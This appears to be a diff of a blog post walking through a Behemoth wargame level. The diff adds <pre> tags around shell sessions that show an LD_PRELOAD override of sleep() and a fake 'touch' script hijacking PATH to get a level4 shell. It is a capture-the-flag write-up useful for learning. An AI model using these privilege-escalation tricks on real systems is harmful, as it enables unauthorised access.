@@ -7,6 +7,7 @@ Preliminary testing has shown that there's a <strong>sleep(2000);</strong> call 
 
 Oh, also, another note: level3 attempts to touch a random file in your current directory so <strong>this must be run from /tmp</strong> where we have write permissions. 
 
+<pre>
 <code>
 level3@behemoth:/tmp$ cat sleep.c
 #include <stdlib.h>
@@ -40,11 +41,13 @@ system("cat   2555" <unfinished ...>
 +++ exited (status 0) +++
 level3@behemoth:/tmp$
 </code>
+</pre>
 
 Hot.
 
 Let's try to get rid of that sleep(), among other things:
 
+<pre>
 <code>
 level3@behemoth:/tmp$ cat sleep.c
 #include <stdlib.h>
@@ -68,9 +71,11 @@ int sleep(int n) {
         return 0;
 }
 </code>
+</pre>
 
 Now we have a fixed pid that gets returned so we know we'll be looking for <strong>/bin/333</strong>. 
 
+<pre>
 <code>
 level3@behemoth:/tmp$ export LD_PRELOAD="/tmp/sleep.so"
 level3@behemoth:/tmp$ ls -lh 5555
@@ -96,6 +101,7 @@ whoami
 +++ exited (status 0) +++
 level3@behemoth:/tmp$
 </code>
+</pre>
 
 Thing is, we now get a lot of permission denied; incredibly lame! But wait! What is this?
 
@@ -103,6 +109,7 @@ Thing is, we now get a lot of permission denied; incredibly lame! But wait! What
 
 What if we had a script named touch... wouldn't it be run? Time to get a shell.
 
+<pre>
 <code>
 level3@behemoth:/tmp$ chmod +x touch
 level3@behemoth:/tmp$ cat touch
@@ -112,5 +119,6 @@ sh-3.1$ /usr/bin/whoami
 level4
 sh-3.1$
 </code>
+</pre>
 
 Awesome possum; time to move on.
